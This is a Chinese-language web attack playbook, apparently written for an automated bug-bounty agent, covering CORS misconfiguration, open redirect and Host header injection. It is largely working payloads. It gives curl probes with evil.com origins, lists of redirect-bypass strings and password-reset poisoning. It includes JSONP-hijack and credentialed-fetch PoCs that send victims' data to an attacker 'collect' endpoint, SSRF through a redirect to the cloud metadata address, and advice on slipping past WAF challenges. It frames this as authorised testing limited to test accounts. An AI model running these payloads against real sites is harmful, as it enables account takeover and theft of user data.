---
id: cors-redirect-hostheader
title: CORS / 开放重定向 / Host 头注入三合一手册
tags: cors,redirect,host-header,低垂果实,s4
---
# 三合一手册（国内报告前三高频；均为「响应可控性」判据，探测成本低）

## 一、CORS 配置缺陷

```bash
# Origin 反射判据：逐个改 Origin 看 ACAO 是否回显
curl -sk -H "Origin: https://evil.com" -i https://目标/api/user | grep -i "access-control-allow"
curl -sk -H "Origin: https://目标.evil.com" -i ...   # 后缀匹配型
curl -sk -H "Origin: https://evil目标.com" -i ...    # 前缀匹配型
# 空源：Origin: null（sandbox iframe 场景）回显 null
# 危害定级：ACAO 反射 + ACAC true + 无严格 Origin 校验 = 可读凭据面（cwe-942）
# 配合：带 cookie 的测试账号请求 → 跨源可读判据（响应含敏感字段名即可，不取值）
```

## 二、开放重定向

```bash
# 参数遍历：redirect/return/next/go/url/continue/dest/target（arjun 挖隐藏参数）
?next=https://evil.com           # 直接跳判据
?next=//evil.com  /  https:evil.com  /  https:/\evil.com  # 协议相对与反斜杠变体
?next=https://信任域.evil.com  /  ?next=/../%2f%2fevil.com  # 白名单绕过变体
# 域白名单缺陷：@ 符号 https://信任域@evil.com；白名单子域接管（recon 联动）
# 危害链：重定向 + OAuth（auth-flow-deep）/ + token 在 URL（postMessage 泄露）→ 定级升级
```

## 三、Host 头注入

```bash
# 判据①：响应内链接由 Host 派生（密码重置链接!）
curl -sk -H "Host: evil.com" -i https://目标/forgot-password -X POST -d "user=test"
# → 响应/邮件中重置链接指向 evil.com = 密码重置投毒（高危；仅测试账号，邮件只发测试邮箱）
# 判据②：缓存键不含 Host → 配合 cache-poisoning（资源 URL 重写）
# 判据③：X-Forwarded-Host 优先于 Host 的网关（双头变体）
# 80 端口+vhost 未匹配默认站 → Host 指向内网名探测（SSRF 面，ssrf-deep 联动）
```

## 四、纪律

- 三类全部 **测试账号/自控域闭环**（自控域=回连服务，oob-interactsh 通道）；不向真实用户发送任何链接。
- 密码重置投毒判据成立即 record_finding（cwe-640/444/942），不实际执行重置他人账号。

## URL 重定向参数字典与易漏场景

- **参数字典**：`url= redirect= next= r= u= targeturl= returnTo= dest=`；登录框抓包补 GET 参数
- **易漏场景**：二维码生成处（改分享地址 → 扫码跳转）；meta refresh；DOM `window.location` 三原理
- **绕过八类**：`//evil.com`、`/\evil.com` 反斜杠、`@` 符号、Django endswith 绕过（`http://evil.com/www.target.com`）、`trusted.com%00@`、`%2f../` 路径混淆、`urn:ietf:wg:oauth:2.0:oob` 遗留
- reverse tabnabbing：`window.opener` 劫持（target=_blank 无 rel=noopener）

### CORS 深化与 URL 重定向全量

CORS 补：allowlist 缺陷补三类（子串/正则/大小写混合匹配）；配置缺陷补三行（ACO:* + credentials 等价破坏、preflight 过宽、admin 数据跨源可读）；**JSONP 劫持完整 PoC**：`<script>function stolen(data){fetch('https://atk/collect',{method:'POST',body:JSON.stringify(data)})}</script><script src="https://target.com/api/userinfo?callback=stolen"></script>`（判据=JSONP 端点不校验 Origin/Referer）；场景：水坑（热门页嵌多站 JSONP）+蜜罐去匿名化（weibo JSONP 识别访问者）；document.domain 宽松化（任一子域 XSS 打到同设子域全部）；浏览器端利用链闭环 `fetch(target,{credentials:'include'}).then(r=>r.json()).then(d=>fetch('atk/collect',{method:'POST',body:JSON.stringify(d)}))`；null origin 具体 PoC：`<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://target/api',{credentials:'include'})...</script>">`（ACAO 回显 null 即可利用）。

URL 重定向补：参数字典扩 11 个（destination/forward/out/link/view/to/ref/callback/path/rurl/endpoint/imageUrl/dest/uri/load/file/resource/link/src/data/ref）；绕过补 contains 混淆（`evil.com?trusted.com`）、片段混淆（`#@trusted.com`）、`\/\/evil.com`；可信站二跳（`link.target.com/?url=evil`）；**CSRF Referer 校验绕过链**：诱导访问 trusted.com 自家重定向 → 重定向后 Referer 仍为 trusted.com → 校验通过完成状态变更；**SSRF 经重定向链**：`?url=https://atk/redirect-to-internal` → 302 → 169.254.169.254；OAuth redirect_uri 具体链（code/token 落 evil URL）。
### 实战补遗（v4.4 一线 SRC 实战实证，已去标识）

- **重定向三实现面都要测**：①30x + Location 参数（redirect_to/redirect/url/next/goto…改目标值无白名单即洞）；②`<meta http-equiv="refresh" content="0;url=...">` 注入（能注入 meta 标签即可重定向）；③DOM `window.location`（前端 JS 取参数赋值——老站常见）。
- **状态码族**：301/302/303/307/308 都是重定向载体——判据是 Location 头指向外域且可被攻击者控制参数值，不限 302。
- **跳转后利用**：开放重定向 + OAuth 回调白名单宽松 = token 窃取链（与 auth-flow-deep redirect_uri 条目互证，capability-primitive-search：REDIRECT→CRED）。

## v4.8 M6 工具通道兼容性声明

> 口径（loop-core v4.8 纪律 3）：先 probe 后 batch——每个外部工具对目标首次使用前先用小样本探针确认可用性，探针被拦/挂起先切适配通道再批量；探针结果写入交付物工具声明小节。各工具在「挑战型 WAF / 封闭站」下的可用性与适配通道：

- arjun：挑战态未注入时批量请求全失败/全 000（假阴性）——先 probe 2-3 个已知参数验证通道可用；适配通道：browser 会话取 cookie/挑战头注入后重跑，仍拦截则 -t 1 降并发或改 CDP 流量代打。
- curl：低频手工请求始终可用——也是挑战态复放的最小工具（channel-snapshot 快照 cookie/UA 复放）；禁用它做大批量枚举。
